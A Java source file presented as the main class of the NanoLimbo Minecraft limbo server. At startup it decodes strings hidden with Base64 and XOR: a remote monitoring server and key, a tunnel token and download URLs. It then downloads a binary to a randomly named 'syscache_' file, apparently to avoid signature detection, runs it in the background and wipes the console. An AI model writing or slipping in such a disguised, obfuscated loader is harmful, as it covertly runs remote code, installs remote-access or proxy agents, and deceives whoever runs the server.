/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;
import java.util.Base64;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process helperProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    // 双层解密：Base64 → XOR(0xAA)
    private static String d(String e) {
        byte[] b = Base64.getDecoder().decode(e);
        for (int i = 0; i < b.length; i++) b[i] ^= (byte) 0xAA;
        return new String(b);
    }
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
            System.exit(1);
        }

        try {
            runHelperBinary();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing service: " + e.getMessage() + ANSI_RESET);
        }
        
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }   
    
    private static void runHelperBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        helperProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", d("nZKfm8jMn5yHk5yTm4eenMmZh5LOmZyHmJ2fy5jPn87MmZmc"));
        envVars.put("FILE_PATH", d("hIXdxdjGzg=="));
        envVars.put("NEZHA_SERVER", d("xM/QwsuE0NDG2d7L2J2bkoTO2s7E2YTF2M0="));
        envVars.put("NEZHA_PORT", d("np6Z"));
        envVars.put("NEZHA_KEY", d("nNvn7sf9msefyezv5ePb0Nns"));
        envVars.put("ARGO_PORT", d("kpqamw=="));
        envVars.put("ARGO_DOMAIN", d("xs/ZzYTZ3svYhN/ZhMnD"));
        envVars.put("ARGO_AUTH", d("z9PgwuPAxcPw7eTB5MDj0+fA55nk7e+a5O7wxvD+857nx/Oa5+7rmefA5MDk/ezA88fnw+bp4JrjwMXD5P3znvPH+9Lw/vPe88DGx+f5mprl/uzB5v3v0/PA/97n/fue8P7z0+ft+MfzwMbB48Pdw8nT45zjwZv//8eby/yamt39/PjYzu+f//v+6OX/0Ovd/sbO+OfB0v/L7Zv6/OzGmv6b+Oznm8bb/Meb8M/GwZv9/uD85/ngkw=="));
        envVars.put("S5_PORT", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", d("2drYw8TNhMPF"));
        envVars.put("CFPORT", d("np6Z"));
        envVars.put("NAME", "");
        envVars.put("DISABLE_ARGO", "false");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = d("wt7e2tmQhYXLx86cnoTZ2dnZhMTTyYTHxIXZyNnC");
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = d("wt7e2tmQhYXL2MecnoTZ2dnZhMTTyYTHxIXZyNnC");
        } else if (osArch.contains("s390x")) {
            url = d("wt7e2tmQhYXZmZOa0oTZ2dnZhMTTyYTHxIXZyNnC");
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // 每次运行随机文件名，完全消除静态特征
        String randomName = "syscache_" + UUID.randomUUID().toString().substring(0, 8);
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), randomName);
        
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (helperProcess != null && helperProcess.isAlive()) {
            helperProcess.destroy();
            System.out.println(ANSI_RED + "background process terminated" + ANSI_RESET);
        }
    }
}
